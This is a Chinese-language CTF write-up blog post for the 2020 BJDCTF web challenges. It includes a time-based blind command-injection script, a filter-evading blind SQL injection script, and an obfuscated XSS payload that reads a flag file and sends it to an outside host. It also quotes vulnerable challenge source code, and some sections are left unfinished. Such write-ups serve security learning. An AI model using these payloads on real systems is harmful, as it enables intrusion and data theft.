date: 2020-05-24
categories:
- 比赛
tags:
- wp
- ctf
title: 2020第三届BJDCTF
---
# 2020BJDCTF第三届

##  帮帮小红花 

```php
# -*-coding:utf-8 -*-
import requests
import re

flag_format = re.compile('flag\\{[0-9a-z]{8}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{12}\\}')
all_letter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ-0123456789abcdefghijklmnopqrstuvwxyz()}{_'


def get_flag(command):
    try:
        r = requests.get('http://183.129.189.60:10071', params={'imagin': command}, timeout=9)
    except:
        return True
    return False


if __name__ == '__main__':
    flag = 'BJD{make_iptables_great_again}'
    while flag_format.match(flag) == None:
        staus = 0
        for i in all_letter:
            payload = 'cat /flag|grep %s &&sleep 10' % (flag + i)
            print(payload)
            if get_flag(payload):
                staus = 1
                flag += i
                print(flag)
                break
        if staus == 0:
            flag = flag[0:-1]

```



##  gob 

![image968](C:\Users\蔡建斌\AppData\Roaming\Typora\typora-user-images\image-20200523090430266.png)

可能存在反序列化

和文件内容无关

上传文件后发现有个filename字段，show界面是直接出现图片的base64编码，如果我们能控制filename字段就有可能任意读取

当唯一麻烦的是，文件名后面有个md5校验值

但是当我们直接上传的时候她会生成一个，哪怕没上传成功

![image1220](https://raw.githubusercontent.com/Explorersss/photo/master/20200523095410.png)

直接拿来用访问show.php就拿到flag了



##  Multiplayer Sports 

 Powered by beego 1.12.1 

http://183.129.189.60:10112/?by=desc

黑名单:`',",!,#,$,&,+,;,<,=,>,?,@,\,|,if,exp,info,ascii,ord,sys,count,order,by,author,where`

给了个hint:`table`,不知道啥意思

```python

import requests
import time
import string


def sqlinj(num):

    burp0_url = "http://183.129.189.60:10117/"
    param={"by":",extractvalue(1,(case when ((select conv(right(left(hex( (select group_concat(a,b) from (select 1`a`,2`b` union select * from hint )`ff` ) ),{POS}),2),16,10)  )-{GUESS}) then 1 ELSE user() end))".format(POS=pos,GUESS=num)}
    burp0_cookies = {"PHPSESSID": "Q/+BAwEBBVVzZXJzAf+CAAEEAQhVc2VybmFtZQEMAAEIUGFzc3dvcmQBDAABCEZpbGVuYW1lAQwAAQRTaWduAQwAAABj/4IBA2FhYQEDYmJiATIuL3VwbG9hZHMvM2UxMDRjYWU2NDAxZDI1NzY2NzZiMmM2ODk3MzE1NGQvcTEuanBnASBhMjVhY2E4OGZkOGYzYjYyMTkyZTYxNzgwMDYzNWQ4NAA=", "_xsrf": "azI3QUxLb3JwTDh5MFI5aXlPM1ZOQ2Y4UnNUSkVnY3E=|1590202537824785027|837f32c5f7f2b6c2a5ad0ffbcc803dff791bb5a078a0b68ea40428f37dfdf2ae"}
    burp0_headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
    r=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,params=param)
    time.sleep(0.5)
    print(param)
    if "/static/img/dundundun.gif" in r.text:
        print("filter ",param)
        exit()
    if "y1ng" in r.text:
        
        return False
    else :
        return True
    



#database: ms
#mysql,sys
#Hint: /Source Password
#table:gtid_executed,sys_config
result="12,Hint: /Source Password: T1Me"
pos=len(result)*2+2

while True:
    flag=False
    for i in string.printable:
        if sqlinj(ord(i)):
            result+=i
            print("Found:"+result)
            flag=True
            break
        print("result:"+result)
    pos+=2
    if flag is False:
        break
```





##  notes 

www.zip

flag.php

```php
if ($_SERVER['REMOTE_ADDR'] === '172.26.176.2') //only admin, who is at 172.26.176.2, can get FLAG
    echo FLAG;
else echo $_SERVER['REMOTE_ADDR'];

```

bot脚本：

```php

if (isset($_POST['url']) && isset($_POST['captcha']) ) { // report bug to our admin who is at 172.26.176.2, our admin will access the bug url to check
    $url = $_POST['url'];
    $captcha = $_POST['captcha'];
    if ( checkNote($url) && checkNote(urldecode($url)) && checkURL($url) &&  substr(md5($captcha), 0 , 6) === $_SESSION['captcha'] ) {
        //admin checking, it will take several seconds
        
    } else alertMes('something wrong', './report_bugs.php');
}
?>
```



```php
function checkURL($url) {
    if ( preg_match('/[|~`^;&]/m', $url) )
        return false;
    else return true;
}
function checkNote($s) {
    $filter = '/show|svg|archive|error|eval|on|atob|\\\u|&#|let|cookie|meta|create|fetch|f[^a-z]*l[^a-z]*a[^a-z]*g|src|append|<script>|func|javascript|res|lo|then|ftp|const|ajax|\$|\'|\"/imX';
    if (preg_match($filter, $s) || strlen($s) >= 500 || strlen($s) <= 1) return false;
    else return true;
}
```





csp:`Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval'; img-src 'self'; object-src 'none'; require-trusted-types-for 'script';`

绕过

```javascript
<script >xmlhttp=new XMLHttpRequest();
xmlhttp[`\x6fnreadystatechange`]=()=>{if(xmlhttp.readyState==4 && xmlhttp.status==200){document[`\x6cocati\x6fn`][`href`]=`http://ccreat\x65r.top:60006/`+xmlhttp[`\x72espo\x6eseText`];}};xmlhttp.open(`GET`,`/lib\x2ffla\x67.php`,true);xmlhttp.send();</script>
```

拿到flag



##  ezupload



 http://183.129.189.60:10057/ 

```
/flag.php
/index.php
/log.php
/login.php
/www.zip
```

flag.php

```php
flag.php关键代码如下：
$classname = $_GET['classname'];
$data = $_GET['data'];
$class = new $classname($data['a'], $data['b']);
Only users from the website can request this page. flag in /flag, have fun!
```



先登陆康康,需要key,相关代码在:

```php
<?php
	header("content-type:text/html;charset=utf-8");
	session_start();
	function getkey()
	{
		$key = '';
		$chars = str_split('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ');
		for ($i = 0; $i < 48; $i++)
		{
			$key = $key . $chars[random_int(0, 61)];
		}
		$_SESSION['key'] = $key;
		return $key;
	}
	function getreferer() {
		static $referer;
		if (isset($_SERVER['HTTP_REFERER'])) {
				$referer = $_SERVER['HTTP_REFERER'];
			}
		elseif(isset($_POST['URL_REFERER'])){
				$referer = $_POST['URL_REFERER'];
			}
		else{
			die("Where are you from?");
		}
		return $referer;
	}
		$key = getkey();
		$url = getreferer();
		if(!preg_match("/^http[s]{0,1}:\/\//i", $url)){
			die("What do you want to do?");
		}
		$host = parse_url($url, PHP_URL_HOST);
		if(preg_match("/^google\.com$/i", $host) or preg_match("/(.*)\.google\.com$/i", $host)){
			$headers = get_headers($url,1);
			if($headers['dd'] === 'MeAquaNo_1!!!'){
				echo $key;
			}
			else{
				echo 'dd beheading!';
			}
		}
		else{
			die("Only dd working at Google can get the key!");
		}
```





## 老开发

 http://183.129.189.60:10000/ 



![image6583](C:\Users\蔡建斌\AppData\Roaming\Typora\typora-user-images\image-20200523230022093.png)

![image6695](C:\Users\蔡建斌\AppData\Roaming\Typora\typora-user-images\image-20200523230029887.png)



User.php

```php
<?php
if ($_SERVER['SCRIPT_FILENAME'] == __FILE__)
    highlight_file(__FILE__);

/**
 * @Entity
 * @Table(name="user")
 */
class User
{
    /** 
     * @Id
     * @Column(type="integer")
     * @GeneratedValue
     */
    protected $uid;
    /** 
     * @Column(type="string") 
     * @unique
     */
    protected $username;
    /** 
     * @Column(type="string") 
     */
    protected $password;
    /** 
     * @Column(type="string") 
     */
    protected $role;

    public function __get($name)
    {
        if (property_exists(__CLASS__, $name)) {
            return $this->$name;
        } else {
            throw new Exception("Class " . __CLASS__ . " doesn't have property " . $name);
        }
    }
    public function __set($name, $value)
    {
        if (property_exists(__CLASS__, $name)) {
            $this->$name = $value;
        } else {
            throw new Exception("Class " . __CLASS__ . " doesn't have property " . $name);
        }
    }
}
```



## 布吉岛

 http://183.129.189.60:10049/ 

 http://183.129.189.60:10050/ 